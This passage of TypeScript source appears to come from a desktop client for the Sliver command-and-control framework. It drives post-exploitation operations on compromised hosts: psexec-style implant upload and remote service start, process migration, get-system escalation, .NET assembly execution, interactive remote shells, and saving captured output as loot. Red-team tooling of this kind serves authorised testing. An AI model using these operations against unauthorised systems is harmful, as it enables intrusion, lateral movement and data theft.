                throw new Error("The selected target returned the wrong execution result type");
              }
              return refreshed.decoded.value;
            case "pending":
              return submittedExecutionReadResult(input.operationId, input.taskId);
            case "canceled":
              throw new Error("The selected target execution read was canceled before a result was available");
            case "failed":
              throw new Error("The selected target rejected the execution read");
            case "outcome-unknown":
              throw new Error("The selected target execution read result could not be confirmed safely");
          }
        }
        const journal = engine.beginExternal(
          input.operationId,
          resolvedExecutionOperationTarget(context, pool, target),
          externalExecutionDescriptor(descriptor, false, target.target.mode),
        );
        let dispatched = false;
        try {
          const response = await runExecutionWorkbenchRead({
            client: pool.client,
            target: { id: target.target.id, mode: target.target.mode, summary: target.target },
            input,
            onDispatch: () => {
              dispatched = true;
              engine.markExternalSubmitted(journal.requestId);
            },
          });
          assertBinding();
          if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, selectedRef)) {
            engine.finishExternal(journal.requestId, "target-disappeared");
            throw new Error("The selected target changed while the execution read was running");
          }
          if (response.taskId) {
            if (target.target.mode === "beacon") {
              pool.recordExecutionTaskFact(response.taskId, selectedRef, input.operationId);
            }
            engine.markExternalSubmitted(journal.requestId, response.taskId);
          }
          if (response.state === "completed") {
            engine.finishExternal(journal.requestId, "completed");
            return response;
          }
          if (!response.taskId) throw new Error("The execution read returned no bounded result");
          return response;
        } catch (error) {
          if (error instanceof ExecutionRemoteRejectedError || error instanceof ExecutionTargetRejectedError) {
            engine.finishExternal(journal.requestId, "failed");
          } else if (!dispatched) {
            engine.finishExternal(journal.requestId, "failed");
          } else if (engine.get(journal.requestId)?.state !== "target-disappeared") {
            engine.finishExternal(journal.requestId, "failed");
          }
          throw error;
        }
      });
    } catch (error) {
      return { ok: false, error: executionBoundaryError(error) };
    } finally {
      admittedContext?.executionAdmissions.delete(admissionId);
      this.executionGlobalAdmissions.delete(admissionId);
    }
  }

  async executeExecutionPlan(
    contentsId: number,
    input: ExecuteExecutionPlanInput,
  ): Promise<OperationResult<ExecutionActionResult>> {
    const admissionId = randomUUID();
    let admittedContext: WindowContext | undefined;
    let plan: InternalExecutionPlan | undefined;
    const artifacts = new Map<ExecutionArtifactRole, Buffer>();
    const generatedBuffers: Buffer[] = [];
    const actionOutputBuffers: Buffer[] = [];
    let journal: TargetOperationRecord | undefined;
    let engine: OperationEngine | undefined;
    let dispatched = false;
    let processHistoryKey: string | undefined;
    let dotNetHistoryKey: string | undefined;
    let bindingCurrent: (() => boolean) | undefined;
    try {
      const context = this.requireWindow(contentsId);
      this.admitExecutionRequest(context, admissionId);
      admittedContext = context;
      plan = this.takeExecutionPlan(context, input.token);
      const capturedPlan = plan;
      return await this.withExecutionPool(contentsId, async (pool, assertBinding) => {
        if (
          capturedPlan.poolKey !== pool.key ||
          capturedPlan.epoch !== pool.epoch ||
          capturedPlan.connectionAttempt !== context.connectionAttempt
        ) throw new Error("The backend connection changed after the execution review");

        bindingCurrent = () => {
          try {
            assertBinding();
            return this.windows.get(contentsId) === context &&
              context.activeTarget !== undefined &&
              sameTargetRefIdentity(context.activeTarget, capturedPlan.target) &&
              this.pools.get(pool.key) === pool &&
              pool.epoch === capturedPlan.epoch;
          } catch {
            return false;
          }
        };
        await pool.refreshDomains([capturedPlan.target.mode === "session" ? "sessions" : "beacons"]);
        if (!bindingCurrent()) throw new Error("The selected target changed before execution dispatch");
        if (capturedPlan.expiresAt <= this.now()) throw new Error("The execution review expired before dispatch");
        const current = pool.targetStore.revalidateTargetRef(capturedPlan.target, pool.epoch);
        if (!current) throw new Error("The selected target is no longer available");
        if (current.target.mode === "session" && current.target.liveness !== "active") {
          throw new Error("The selected session is no longer active");
        }
        assertExecutionOperationSupported(capturedPlan.draft.operationId, current.target);

        for (const artifact of capturedPlan.artifacts) {
          const consumed = this.executionArtifacts.consumeInput(artifact.scope, artifact.handle);
          const expected = capturedPlan.review.artifacts.find((candidate) => candidate.role === artifact.role);
          if (
            !expected ||
            consumed.metadata.sha256 !== expected.sha256 ||
            consumed.metadata.size !== expected.size
          ) {
            consumed.data.fill(0);
            throw new Error("A reviewed execution artifact no longer matches its bound metadata");
          }
          artifacts.set(artifact.role, consumed.data);
        }

        let implantConfig: clientpb.ImplantConfig | undefined;
        if (
          capturedPlan.draft.operationId === "execution.migrate" ||
          capturedPlan.draft.operationId === "privilege.get-system"
        ) {
          implantConfig = pool.implantConfigForTarget(current.target);
        } else if (
          capturedPlan.draft.operationId === "execution.psexec" &&
          capturedPlan.draft.source.kind === "profile"
        ) {
          const profile = pool.profile(capturedPlan.draft.source.profileName);
          if (!profile.Config) throw new Error("The selected service profile has no implant configuration");
          implantConfig = clientpb.ImplantConfig.create(profile.Config);
        }

        const descriptor = executionOperationDescriptor(capturedPlan.draft.operationId);
        engine = this.requireOperationEngine(contentsId, context, pool);
        journal = engine.beginExternal(
          capturedPlan.draft.operationId,
          capturedPlan.journalTarget,
          externalExecutionDescriptor(descriptor, true, current.target.mode),
        );
        if (capturedPlan.draft.operationId === "execution.process" && current.target.mode === "session") {
          processHistoryKey = this.beginProcessExecutionHistory(pool, current, journal, capturedPlan.draft);
        }
        if (capturedPlan.draft.operationId === "execution.assembly") {
          dotNetHistoryKey = this.beginDotNetExecutionHistory(pool, current, journal, capturedPlan);
        }
        const capturedEngine = engine;
        const capturedJournal = journal;
        const markDispatched = (): void => {
          if (!bindingCurrent?.()) throw new Error("The selected target changed before execution dispatch");
          const submitted = capturedEngine.markExternalSubmitted(capturedJournal.requestId);
          if (submitted.state !== "running") {
            throw new Error("The reviewed execution no longer belongs to the active target");
          }
          dispatched = true;
        };

        let action;
        try {
          action = await dispatchExecutionAction({
            client: pool.client,
            target: { id: current.target.id, mode: current.target.mode, summary: current.target },
            draft: capturedPlan.draft,
            artifacts,
            ...(implantConfig ? { implantConfig } : {}),
            onDispatch: markDispatched,
            psexec: async ({ draft, serviceExecutable, implantConfig: serviceConfig, onDispatch }) => {
              let executable = serviceExecutable ? Buffer.from(serviceExecutable) : undefined;
              if (executable) generatedBuffers.push(executable);
              if (!executable) {
                if (!serviceConfig) throw new ExecutionWorkbenchInputError("The reviewed service profile is unavailable");
                const generated = await pool.client.generateImplant(
                  serviceConfig,
                  "",
                  GENERATE_TIMEOUT_SECONDS,
                );
                if (!generated.File?.Data?.length) throw new ExecutionWorkbenchInputError("The service profile generated no executable");
                executable = Buffer.from(generated.File.Data);
                generated.File.Data.fill(0);
                generatedBuffers.push(executable);
              }
              const remoteBinaryPath = psexecRemoteBinaryPath(draft.remotePath);
              const uploadPath = psexecUploadPath(draft.hostname, remoteBinaryPath);
              onDispatch();
              const uploaded = await pool.client.uploadSession(
                current.target.id,
                uploadPath,
                executable,
                { overwrite: true },
                draft.timeoutSeconds,
              );
              if (uploaded.Response?.Err?.trim()) throw new ExecutionRemoteRejectedError();
              await delayMilliseconds(5_000);
              const started = await pool.client.startRemoteServiceSession(
                current.target.id,
                {
                  hostname: draft.hostname,
                  serviceName: draft.serviceName,
                  serviceDescription: draft.serviceDescription,
                  binaryPath: remoteBinaryPath,
                },
                draft.timeoutSeconds,
              );
              if (started.Response?.Err?.trim()) return { __executionPartial: true };
              let cleanupConfirmed = true;
              try {
                const removed = await pool.client.removeRemoteServiceSession(
                  current.target.id,
                  { hostname: draft.hostname, serviceName: draft.serviceName },
                  draft.timeoutSeconds,
                );
                if (removed.Response?.Err?.trim()) cleanupConfirmed = false;
              } catch {
                cleanupConfirmed = false;
              }
              return cleanupConfirmed ? {} : { __executionPartial: true };
            },
          });
          if (action.stdout) actionOutputBuffers.push(action.stdout);
          if (action.stderr) actionOutputBuffers.push(action.stderr);
        } catch (error) {
          if (error instanceof ExecutionRemoteRejectedError || error instanceof ExecutionTargetRejectedError) {
            let failed = capturedEngine.finishExternal(capturedJournal.requestId, "failed");
            if (failed.state === "outcome-unknown" && bindingCurrent()) {
              failed = capturedEngine.resolveExternalOutcome(capturedJournal.requestId, "failed");
            }
            const result = this.retainExecutionResult(context, pool, current, {
              requestId: capturedJournal.requestId,
              operationId: capturedPlan.draft.operationId,
              state: "failed",
              message: descriptor.failedMessage,
            });
            return result;
          }
          if (dispatched) {
            capturedEngine.finishExternal(capturedJournal.requestId, "outcome-unknown");
            return this.retainExecutionResult(context, pool, current, {
              requestId: capturedJournal.requestId,
              operationId: capturedPlan.draft.operationId,
              state: "outcome-unknown",
              message: "The execution operation was dispatched, but its final outcome could not be confirmed. Refresh authoritative target and task state before continuing.",
            });
          }
          capturedEngine.finishExternal(capturedJournal.requestId, "failed");
          throw error;
        }

        if (!bindingCurrent()) {
          if (dispatched) capturedEngine.finishExternal(capturedJournal.requestId, "outcome-unknown");
          throw new Error("The selected target changed while the reviewed execution was running");
        }
        if (action.taskId) {
          const correlated = capturedEngine.markExternalSubmitted(capturedJournal.requestId, action.taskId);
          if (correlated.taskId === action.taskId) {
            pool.recordExecutionTaskFact(action.taskId, current.ref, capturedPlan.draft.operationId,
              capturedPlan.draft.operationId === "execution.process" && capturedPlan.draft.captureOutput && !capturedPlan.draft.background);
          }
          this.ensureOperationReconciliation(contentsId);
          return this.retainExecutionResult(context, pool, current, {
            requestId: capturedJournal.requestId,
            operationId: capturedPlan.draft.operationId,
            state: "submitted",
            message: descriptor.submittedMessage,
            taskId: action.taskId,
            ...(action.pid === undefined ? {} : { pid: action.pid }),
          }, {}, capturedPlan.draft.operationId === "execution.process" && capturedPlan.draft.captureOutput && !capturedPlan.draft.background);
        }

        const terminalState = action.partial ? "partial" : "completed";
        let terminal = capturedEngine.finishExternal(capturedJournal.requestId, terminalState);
        if (terminal.state === "outcome-unknown" && terminalState === "completed" && bindingCurrent()) {
          terminal = capturedEngine.resolveExternalOutcome(capturedJournal.requestId, "completed");
        }
        if (terminal.state !== terminalState) {
          throw new Error("The execution result could not be bound to the active operation journal");
        }
        return this.retainExecutionResult(
          context,
          pool,
          current,
          {
            requestId: capturedJournal.requestId,
            operationId: capturedPlan.draft.operationId,
            state: terminalState,
            message: action.partial
              ? capturedPlan.draft.operationId === "execution.psexec"
                ? "The remote service workflow completed only partially. The uploaded executable remains and later service state or cleanup could not be confirmed."
                : "The primary execution effect completed, but cleanup could not be confirmed."
              : capturedPlan.draft.operationId === "execution.psexec"
                ? "The remote service started and was removed. The uploaded executable remains at the reviewed remote directory."
                : action.summary,
            ...(action.pid === undefined ? {} : { pid: action.pid }),
            ...(action.exitCode === undefined ? {} : { exitCode: action.exitCode }),
          },
          {
            ...(action.stdout ? { stdout: { data: action.stdout, truncated: action.stdoutTruncated === true } } : {}),
            ...(action.stderr ? { stderr: { data: action.stderr, truncated: action.stderrTruncated === true } } : {}),
          },
          capturedPlan.draft.operationId === "execution.process" && capturedPlan.draft.captureOutput && !capturedPlan.draft.background,
        );
      });
    } catch (error) {
      if (journal && engine && !dispatched && !TERMINAL_OPERATION_STATES.has(engine.get(journal.requestId)?.state ?? "failed")) {
        engine.finishExternal(journal.requestId, "failed");
      }
      if (journal && processHistoryKey) {
        this.updateProcessExecutionHistory(processHistoryKey, journal.requestId, {
          state: dispatched ? "outcome-unknown" : "request-failed",
          error: dispatched
            ? "The execution was dispatched, but its final outcome could not be confirmed."
            : executionBoundaryError(error),
        });
      }
      if (journal && dotNetHistoryKey) {
        this.updateDotNetExecutionHistory(dotNetHistoryKey, journal.requestId, {
          state: dispatched ? "outcome-unknown" : "request-failed",
          error: dispatched
            ? "The execution was dispatched, but its final outcome could not be confirmed."
            : executionBoundaryError(error),
        });
      }
      return { ok: false, error: executionBoundaryError(error) };
    } finally {
      for (const data of artifacts.values()) data.fill(0);
      for (const data of generatedBuffers) data.fill(0);
      for (const data of actionOutputBuffers) data.fill(0);
      if (plan) {
        clearExecutionDraftSecrets(plan.draft);
        for (const artifact of plan.artifacts) {
          try { this.executionArtifacts.remove(artifact.scope, artifact.handle); } catch { /* consumed or revoked */ }
        }
      }
      admittedContext?.executionAdmissions.delete(admissionId);
      this.executionGlobalAdmissions.delete(admissionId);
    }
  }

  async getExecutionResult(
    contentsId: number,
    input: ExecutionResultRequest,
  ): Promise<OperationResult<ExecutionActionResult>> {
    const admissionId = randomUUID();
    let admittedContext: WindowContext | undefined;
    try {
      const context = this.requireWindow(contentsId);
      this.admitExecutionRequest(context, admissionId);
      admittedContext = context;
      this.pruneExecutionResults(context);
      if (!context.executionResults.has(input.requestId)) {
        const shared = this.sharedExecutionHistoryResult(contentsId, input.requestId);
        if (!shared?.record.result) throw new Error("The execution result is unavailable or expired");
        if (
          "assemblyName" in shared.record &&
          shared.target.target.mode === "beacon" &&
          shared.record.result.taskId &&
          (shared.record.result.state === "submitted" || shared.record.result.state === "outcome-unknown")
        ) {
          return { ok: true, value: await this.refreshSharedDotNetBeaconResult(shared) };
        }
        return { ok: true, value: cloneExecutionActionResult(shared.record.result) };
      }
      const result = this.requireExecutionResult(context, input.requestId);
      return await this.withExecutionPool(contentsId, async (pool, assertBinding) => {
        if (
          result.poolKey !== pool.key ||
          result.epoch !== pool.epoch ||
          result.connectionAttempt !== context.connectionAttempt ||
          !context.activeTarget ||
          !sameTargetRefIdentity(context.activeTarget, result.target)
        ) throw new Error("The execution result is unavailable for the current target");
        if (
          !result.value.taskId ||
          result.target.mode !== "beacon" ||
          (result.value.state !== "submitted" && result.value.state !== "outcome-unknown")
        ) return cloneExecutionActionResult(result.value);

        const target = pool.targetStore.revalidateTargetRef(result.target, pool.epoch);
        if (!target) throw new Error("The selected target is no longer available");
        const engine = this.requireOperationEngine(contentsId, context, pool);
        const assertCurrent = (): void => {
          assertBinding();
          if (
            this.windows.get(contentsId) !== context ||
            context.executionResults.get(input.requestId) !== result ||
            !context.activeTarget ||
            !sameTargetRefIdentity(context.activeTarget, result.target) ||
            !pool.targetStore.revalidateTargetRef(result.target, pool.epoch)
          ) throw new Error("The execution result is unavailable for the current target");
        };
        const refreshed = await this.refreshExecutionBeaconTask({
          context,
          pool,
          target,
          engine,
          taskId: result.value.taskId,
          operationId: result.value.operationId,
          expectedRequestId: input.requestId,
          ...(result.processWaited ? { processWaited: true } : {}),
          assertCurrent,
        });
        try {
          assertCurrent();
        } catch (error) {
          clearRefreshedExecutionBuffers(refreshed);
          throw error;
        }
        const descriptor = executionOperationDescriptor(result.value.operationId);
        switch (refreshed.state) {
          case "pending":
            return cloneExecutionActionResult(result.value);
          case "canceled":
            return this.retainExecutionResult(context, pool, target, {
              requestId: input.requestId,
              operationId: result.value.operationId,
              state: "canceled",
              message: "The beacon execution task was canceled before completion.",
              taskId: result.value.taskId,
            });
          case "failed":
            return this.retainExecutionResult(context, pool, target, {
              requestId: input.requestId,
              operationId: result.value.operationId,
              state: "failed",
              message: descriptor.failedMessage,
              taskId: result.value.taskId,
            });
          case "outcome-unknown":
            return this.retainExecutionResult(context, pool, target, {
              requestId: input.requestId,
              operationId: result.value.operationId,
              state: "outcome-unknown",
              message: "The beacon task completed, but its exact execution result could not be confirmed safely.",
              taskId: result.value.taskId,
            });
          case "decoded": {
            if (refreshed.decoded.kind !== "action") {
              clearRefreshedExecutionBuffers(refreshed);
              throw new Error("The selected target returned the wrong execution result type");
            }
            const action = refreshed.decoded.value;
            return this.retainExecutionResult(
              context,
              pool,
              target,
              {
                requestId: input.requestId,
                operationId: result.value.operationId,
                state: "completed",
                message: action.summary,
                taskId: result.value.taskId,
                ...(action.pid === undefined ? {} : { pid: action.pid }),
                ...(action.exitCode === undefined ? {} : { exitCode: action.exitCode }),
              },
              {
                ...(action.stdout
                  ? { stdout: { data: action.stdout, truncated: action.stdoutTruncated === true } }
                  : {}),
                ...(action.stderr
                  ? { stderr: { data: action.stderr, truncated: action.stderrTruncated === true } }
                  : {}),
              },
            );
          }
        }
      });
    } catch (error) {
      return { ok: false, error: executionBoundaryError(error) };
    } finally {
      admittedContext?.executionAdmissions.delete(admissionId);
      this.executionGlobalAdmissions.delete(admissionId);
    }
  }

  async readExecutionOutput(
    contentsId: number,
    input: ReadExecutionOutputInput,
  ): Promise<OperationResult<ExecutionOutputReadResult>> {
    let data: Buffer | undefined;
    try {
      const context = this.requireWindow(contentsId);
      this.pruneExecutionResults(context);
      if (!context.executionResults.has(input.requestId)) {
        const shared = this.sharedExecutionHistoryResult(contentsId, input.requestId);
        if (!shared) throw new Error("The execution result is unavailable or expired");
        shared.assertCurrent();
        const output = this.sharedExecutionHistoryOutput(shared.record, input.stream);
        data = output.data;
        shared.assertCurrent();
        return { ok: true, value: { data: Uint8Array.from(data), truncated: output.truncated } };
      }
      const result = this.requireExecutionResult(context, input.requestId);
      const pool = context.poolKey ? this.pools.get(context.poolKey) : undefined;
      if (
        this.windows.get(contentsId) !== context ||
        !pool ||
        !["connected", "degraded", "reconnecting"].includes(pool.snapshot.connection.status) ||
        this.pools.get(result.poolKey) !== pool ||
        pool.epoch !== result.epoch ||
        context.connectionAttempt !== result.connectionAttempt ||
        !context.activeTarget ||
        !sameTargetRefIdentity(context.activeTarget, result.target) ||
        context.executionResults.get(input.requestId) !== result
      ) throw new Error("The execution result no longer belongs to the active target");

      const artifact = result.output[input.stream];
      const output = result.value.output?.find((item) => item.stream === input.stream);
      if (!artifact || !output || output.handle !== artifact.handle) {
        throw new Error("The requested execution output is unavailable");
      }
      const maximumBytes = input.stream === "combined"
        ? 2 * EXECUTION_WORKBENCH_OUTPUT_MAX_BYTES
        : EXECUTION_WORKBENCH_OUTPUT_MAX_BYTES;
      if (output.size > maximumBytes) throw new Error("The requested execution output is unavailable");
      const retrieved = this.executionArtifacts.getResult(artifact.scope, artifact.handle);
      data = retrieved.data;
      if (data.byteLength !== output.size || data.byteLength > maximumBytes) {
        throw new Error("The requested execution output is unavailable");
      }
      return { ok: true, value: { data: Uint8Array.from(data), truncated: output.truncated } };
    } catch (error) {
      return { ok: false, error: executionBoundaryError(error) };
    } finally {
      data?.fill(0);
    }
  }

  async addExecutionOutputToLoot(
    contentsId: number,
    input: AddExecutionOutputToLootInput,
  ): Promise<OperationResult<LootSummary>> {
    let data: Buffer | undefined;
    let loot: clientpb.Loot | undefined;
    let response: clientpb.Loot | undefined;
    try {
      return await this.withExecutionPool(contentsId, async (pool, assertBinding) => {
        const context = this.requireWindow(contentsId);
        this.pruneExecutionResults(context);
        let assertCurrent: () => void;
        let target: RevalidatedTarget;
        if (context.executionResults.has(input.requestId)) {
          const result = this.requireExecutionResult(context, input.requestId);
          assertCurrent = (): void => {
            assertBinding();
            if (
              this.windows.get(contentsId) !== context ||
              this.pools.get(result.poolKey) !== pool ||
              pool.epoch !== result.epoch ||
              context.connectionAttempt !== result.connectionAttempt ||
              !context.activeTarget ||
              !sameTargetRefIdentity(context.activeTarget, result.target) ||
              context.executionResults.get(input.requestId) !== result
            ) throw new Error("The execution result no longer belongs to the active target");
          };
          assertCurrent();
          const current = pool.targetStore.revalidateTargetRef(result.target, pool.epoch);
          if (!current) throw new Error("The execution result is unavailable for the current target");
          target = current;
          const artifact = result.output[input.stream];
          const output = result.value.output?.find((item) => item.stream === input.stream);
          if (!artifact || !output || output.handle !== artifact.handle) {
            throw new Error("The requested execution output is unavailable");
          }
          const maximumBytes = input.stream === "combined"
            ? 2 * EXECUTION_WORKBENCH_OUTPUT_MAX_BYTES
            : EXECUTION_WORKBENCH_OUTPUT_MAX_BYTES;
          if (output.size > maximumBytes) throw new Error("The requested execution output is unavailable");
          data = this.executionArtifacts.getResult(artifact.scope, artifact.handle).data;
          if (data.byteLength !== output.size || data.byteLength > maximumBytes) {
            throw new Error("The requested execution output is unavailable");
          }
        } else {
          const shared = this.sharedExecutionHistoryResult(contentsId, input.requestId);
          if (!shared || shared.pool !== pool) throw new Error("The execution result is unavailable or expired");
          assertCurrent = (): void => { assertBinding(); shared.assertCurrent(); };
          assertCurrent();
          target = shared.target;
          data = this.sharedExecutionHistoryOutput(shared.record, input.stream).data;
        }
        const isText = isProbablyTextLoot(data);
        const fileName = safeArtifactFileName(
          `execute-${input.stream}-${input.requestId}.${isText ? "txt" : "bin"}`,
        );
        const requestedName = input.name.trim();
        if (
          requestedName.length > OPERATOR_DATA_LIMITS.nameCharacters ||
          /[\u0000-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069]/u.test(requestedName)
        ) throw new Error("Loot name is invalid");
        loot = clientpb.Loot.create({
          Name: requestedName || fileName,
          OriginHostUUID: target.target.hostId,
          FileType: isText ? clientpb.FileType.TEXT : clientpb.FileType.BINARY,
          File: commonpb.File.create({ Name: fileName, Data: data }),
        });
        assertCurrent();
        try {
          response = await pool.client.lootAdd(loot);
          assertCurrent();
          return lootSummary(response);
        } catch {
          throw new Error("The loot submission may have completed; refresh loot before retrying");
        }
      });
    } finally {
      data?.fill(0);
      loot?.File?.Data.fill(0);
      response?.File?.Data.fill(0);
    }
  }

  async saveExecutionResult(
    sender: WebContents,
    input: SaveExecutionResultInput,
  ): Promise<OperationResult<SaveExecutionResultResult>> {
    let data: Buffer | undefined;
    try {
      const context = this.requireWindow(sender.id);
      this.pruneExecutionResults(context);
      if (!context.executionResults.has(input.requestId)) {
        return await this.saveSharedExecutionHistoryResult(sender, input);
      }
      const result = this.requireExecutionResult(context, input.requestId);
      const artifact = result.output[input.stream];
      if (!artifact) throw new Error("The requested execution output is unavailable");
      const owner = requireOwnerWindow(sender);
      if (owner.isDestroyed()) throw new Error("The application window is no longer available");
      const metadata = this.executionArtifacts.metadata(artifact.scope, artifact.handle);
      let selection;
      try {
        selection = await dialog.showSaveDialog(owner, {
          title: "Save execution output",
          defaultPath: safeArtifactFileName(metadata.suggestedBasename),
        });
      } catch {
        throw new Error("Could not open the native execution output save dialog");
      }
      if (selection.canceled || !selection.filePath) return { ok: true, value: { saved: false } };
      const pool = context.poolKey ? this.pools.get(context.poolKey) : undefined;
      const assertCurrent = (): void => {
        if (
          this.windows.get(sender.id) !== context ||
          !pool ||
          this.pools.get(result.poolKey) !== pool ||
          pool.epoch !== result.epoch ||
          context.connectionAttempt !== result.connectionAttempt ||
          !context.activeTarget ||
          !sameTargetRefIdentity(context.activeTarget, result.target) ||
          context.executionResults.get(input.requestId) !== result
        ) throw new Error("The execution result no longer belongs to the active target");
      };
      assertCurrent();
      const intent = await this.reserveSessionSaveIntent(selection.filePath);
      assertCurrent();
      const retrieved = this.executionArtifacts.getResult(artifact.scope, artifact.handle);
      data = retrieved.data;
      try {
        await this.commitSessionSaveIntent(intent, data, assertCurrent);
      } catch {
        throw new Error("Could not save the execution output");
      }
      return {
        ok: true,
        value: { saved: true, fileName: safeArtifactFileName(basename(intent.destinationPath)) },
      };
    } catch (error) {
      return { ok: false, error: executionBoundaryError(error) };
    } finally {
      data?.fill(0);
    }
  }

  private async saveSharedExecutionHistoryResult(
    sender: WebContents,
    input: SaveExecutionResultInput,
  ): Promise<OperationResult<SaveExecutionResultResult>> {
    let data: Buffer | undefined;
    try {
      const shared = this.sharedExecutionHistoryResult(sender.id, input.requestId);
      if (!shared) throw new Error("The execution result is unavailable or expired");
      const owner = requireOwnerWindow(sender);
      if (owner.isDestroyed()) throw new Error("The application window is no longer available");
      const metadata = shared.record.result?.output?.find((item) => item.stream === input.stream);
      if (!metadata) throw new Error("The requested execution output is unavailable");
      let selection;
      try {
        selection = await dialog.showSaveDialog(owner, {
          title: "Save execution output",
          defaultPath: safeArtifactFileName(metadata.suggestedFileName),
        });
      } catch {
        throw new Error("Could not open the native execution output save dialog");
      }
      if (selection.canceled || !selection.filePath) return { ok: true, value: { saved: false } };
      shared.assertCurrent();
      const intent = await this.reserveSessionSaveIntent(selection.filePath);
      shared.assertCurrent();
      data = this.sharedExecutionHistoryOutput(shared.record, input.stream).data;
      try {
        await this.commitSessionSaveIntent(intent, data, shared.assertCurrent);
      } catch {
        throw new Error("Could not save the execution output");
      }
      return { ok: true, value: { saved: true, fileName: safeArtifactFileName(basename(intent.destinationPath)) } };
    } catch (error) {
      return { ok: false, error: executionBoundaryError(error) };
    } finally {
      data?.fill(0);
    }
  }

  async prepareSessionShell(
    contentsId: number,
    rendererProcessId: number,
    rendererFrameToken: string,
    input: PrepareSessionShellInput,
  ): Promise<OperationResult<SessionShellPlan>> {
    const admissionId = randomUUID();
    let admittedContext: WindowContext | undefined;
    try {
      const context = this.requireWindow(contentsId);
      if (context.sessionShellPrepareAdmissions.size >= MAX_WINDOW_SESSION_SHELL_PREPARES) {
        throw new Error("Too many shell preparations are already running in this window");
      }
      if (this.sessionShellPrepareGlobalAdmissions.size >= MAX_GLOBAL_SESSION_SHELL_PREPARES) {
        throw new Error("The global shell preparation capacity is currently full");
      }
      context.sessionShellPrepareAdmissions.add(admissionId);
      this.sessionShellPrepareGlobalAdmissions.add(admissionId);
      admittedContext = context;
      return await this.withPool(contentsId, async (pool, assertBinding) => {
        await pool.refreshDomains(["sessions"]);
        assertBinding();
        const selected = this.requireSelectedSession(contentsId, pool);
        const selectedRef = selected.target.ref;
        const binding = streamOwnerBinding(
          selected.context,
          pool,
          selectedRef,
          rendererProcessId,
          rendererFrameToken,
        );
        const requestPty = input.requestPty && selected.platform !== "windows";
        const normalizedInput: PrepareSessionShellInput = {
          requestPty,
          ...(input.path === undefined ? {} : { path: input.path }),
          ...(requestPty && input.rows !== undefined && input.columns !== undefined
            ? { rows: input.rows, columns: input.columns }
            : {}),
        };
        const shellPath = input.path ?? (selected.platform === "windows" ? "powershell.exe" : "/bin/bash");
        const rows = normalizedInput.rows ?? 24;
        const columns = normalizedInput.columns ?? 80;
        const assertExactSession = (): RevalidatedTarget => {
          const current = pool.targetStore.revalidateTargetRef(selectedRef, pool.epoch);
          if (!current || current.target.mode !== "session" || current.target.liveness !== "active") {
            throw new Error("The selected session is no longer active");
          }
          return current;
        };
        const start: StartMainStreamEndpoint = async ({ signal, emitOutputWithBackpressure, remoteClose }) => {
          let current = assertExactSession();
          if (signal.aborted) throw new Error("The shell request was canceled before dispatch");
          if (selected.platform !== "windows") {
            // ShellReq has no environment field; the shell inherits the session's
            // environment, including when its startup files run.
            const response = await pool.client.setEnvSession(current.target.id, "TERM", "xterm-256color", 30);
            if (response.Response?.Err?.trim()) throw new Error("The target rejected the shell terminal environment");
            current = assertExactSession();
            if (signal.aborted) throw new Error("The shell request was canceled before dispatch");
          }
          const handle = await pool.client.startShellSession(
            current.target.id,
            {
              path: shellPath,
              pty: requestPty,
              rows,
              cols: columns,
            },
            30,
          );
          if (signal.aborted) {
            await handle.close().catch(() => undefined);
            throw new Error("The shell request was canceled during startup");
          }

          void (async () => {
            try {
              for await (const chunk of handle.output) {
                try {
                  if (!await emitOutputWithBackpressure(chunk)) break;
                } finally {
                  chunk.fill(0);
                }
              }
              remoteClose("remote-close");
            } catch {
              remoteClose("transport-error");
            }
          })();

          const endpoint: MainStreamEndpoint = {
            write: async (data, writeSignal) => {
              if (writeSignal.aborted || signal.aborted) throw new Error("The shell stream is closing");
              await handle.write(data);
              if (writeSignal.aborted || signal.aborted) throw new Error("The shell write did not settle in time");
            },
            close: async () => {
              await handle.close();
            },
            kill: async (killSignal) => {
              const exact = assertExactSession();
              if (killSignal.aborted || signal.aborted) throw new Error("The shell kill request was canceled");
              const response = await pool.client.terminateSessionProcess(exact.target.id, handle.pid, true);
              if (response.Response?.Err?.trim()) throw new Error("The target rejected the shell kill request");
            },
            ...(requestPty
              ? {
                  resize: async (nextRows: number, nextColumns: number, resizeSignal: AbortSignal) => {
                    if (resizeSignal.aborted || signal.aborted) throw new Error("The shell resize was canceled");
                    await handle.resize(nextRows, nextColumns);
                  },
                }
              : {}),
          };
          return endpoint;
        };
        return this.streams.prepareSessionShell({ binding, input: normalizedInput, start });
      });
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    } finally {
      admittedContext?.sessionShellPrepareAdmissions.delete(admissionId);
      this.sessionShellPrepareGlobalAdmissions.delete(admissionId);
    }
  }

  async listSessionShells(
    contentsId: number,
    rendererProcessId: number,
    rendererFrameToken: string,
    input: ListSessionShellsInput,
  ): Promise<OperationResult<SessionShellResourceList>> {
    void input;
    return this.withPool(contentsId, async (pool, assertBinding) => {
      assertBinding();
      const selected = this.requireSelectedSession(contentsId, pool);
      return this.streams.listSessionShells(streamOwnerBinding(
        selected.context,
        pool,
        selected.target.ref,
        rendererProcessId,
        rendererFrameToken,
      ));
    });
  }

  async actOnSessionShell(
    contentsId: number,
    rendererProcessId: number,
    rendererFrameToken: string,
    input: SessionShellResourceActionInput,
  ): Promise<OperationResult<SessionShellResourceActionResult>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      assertBinding();
      const selected = this.requireSelectedSession(contentsId, pool);
      const binding = streamOwnerBinding(
        selected.context,
        pool,
        selected.target.ref,
        rendererProcessId,
        rendererFrameToken,
      );
      const result = await this.streams.actOnSessionShell(binding, input);
      assertBinding();
      return result;
    });
  }

  async getTerminalRuntime(contentsId: number): Promise<OperationResult<TerminalRuntimeAsset>> {
    let admitted = false;
    try {
      const context = this.requireWindow(contentsId);
      if (this.terminalRuntimeAdmissions.has(contentsId)) {
        throw new Error("A terminal runtime request is already in progress for this window");
      }
      this.terminalRuntimeAdmissions.add(contentsId);
      admitted = true;
      const asset = await loadTerminalRuntime();
      if (this.windows.get(contentsId) !== context) throw new Error("Application window changed during runtime load");
      return { ok: true, value: asset };
    } catch {
      return { ok: false, error: "The verified packaged terminal runtime is unavailable" };
    } finally {
      if (admitted) this.terminalRuntimeAdmissions.delete(contentsId);
    }
  }

  attachStream(
    contentsId: number,
    rendererProcessId: number,
    rendererFrameToken: string,
    request: StreamAttachRequest,
    port: MessagePortMain,
  ): void {
    const context = this.requireWindow(contentsId);
    const pool = context.poolKey ? this.pools.get(context.poolKey) : undefined;
    const usableStatuses = new Set(["connected", "degraded", "reconnecting"]);
    if (!pool || !usableStatuses.has(pool.snapshot.connection.status)) {
      throw new Error("Connect to a Sliver server before attaching a stream");
    }
